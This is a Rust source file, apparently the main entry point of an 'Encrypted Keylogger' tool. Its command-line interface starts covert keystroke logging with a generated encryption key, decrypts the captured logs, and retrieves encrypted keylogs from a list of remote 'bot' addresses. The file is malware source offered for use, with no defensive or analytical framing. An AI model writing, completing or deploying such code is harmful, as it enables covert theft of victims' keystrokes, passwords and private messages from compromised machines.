extern crate clap;

extern crate keylogger_lib;

fn main() {
    let args = clap::App::new("Encrypted Keylogger")
        .version("0.1.2")
        .author("Hand of C'thulhu")
        .arg(clap::Arg::with_name("decrypt")
            .short("D")
            .long("decrypt")
            .value_name("FILE")
            .help("Specify the decrypt file, and turn into decrypt mode")
            .takes_value(true)
            //.requires("key")
            .min_values(0))
        .arg(clap::Arg::with_name("retrieve")
            .short("R")
            .long("retrieve")
            .help("Retrieves data from remote location, pair with --decrypt to automatically print decrypted data")
            .takes_value(true)
            .value_name("DEST_FOLDER"))
        .arg(clap::Arg::with_name("bot_addr")
            .long("bot-addr")
            .requires("retrieve")
            .takes_value(true)
            .value_name("FILE"))
        .arg(clap::Arg::with_name("KEY")
            .help("Encryption Key")
//            .short("k")
//            .long("key")
//            .takes_value(true)
//            .value_name("FILE")
//            .required_unless("retrieve")
            .required(true))
        .get_matches();

    if let Some(retrieve_path) = args.value_of("retrieve") {
        let retrieve_path = std::path::Path::new(retrieve_path);
        let bot_addr_list = keylogger_lib::parse_bot_list(args.value_of("bot_addr").unwrap_or("bot_addr.list")).unwrap_or_else(|err| {
            println!("Error with bot-address-list path: {}", err);
            std::process::exit(1);
        });

        //TODO: make retrieval streamified
        let encrypted_data_paths: Vec<Vec<std::path::PathBuf>> = bot_addr_list.iter().map(|bot_addr| {
            keylogger_lib::retrieve_remote_keylogs(bot_addr).iter().map(|&(ref name, ref data)| {
                use std::io::Write;
                let output_path = retrieve_path.join(format!("{}_{}", bot_addr.split(":").collect::<Vec<&str>>()[0], name));

                std::fs::OpenOptions::new()
                    .write(true)
                    .create(true)
                    .append(true)
                    .open(&output_path)
                    .expect("Open problems")
                    .write(data.as_ref())
                    .expect("Write problems");

                output_path
            }).collect::<Vec<std::path::PathBuf>>()
        }).collect();
        let encrypted_data_paths: Vec<&std::path::PathBuf> = encrypted_data_paths.iter().flat_map(|p| p).collect();
        println!("{:?}", encrypted_data_paths);
        if args.is_present("decrypt") {
            for path in encrypted_data_paths {
                keylogger_lib::decrypt(path.to_str().unwrap(), args.value_of("KEY").unwrap()).unwrap_or_else(|err| println!("Error with decrypting: {}", err));
            }
        }
        return;
    }
    let key_path = args.value_of("KEY").unwrap();
    if let Some(decrypt_path) = args.value_of("decrypt") {
        keylogger_lib::decrypt(decrypt_path, key_path).unwrap_or_else(|err| println!("Error with decrypting: {}", err));
    } else {
        if let Err(problem) = keylogger_lib::generate_key_and_nonce(key_path) {
            println!("Error with key input: {}", problem.description());
        } else {
            keylogger_lib::key_log(key_path);
        }
    }
}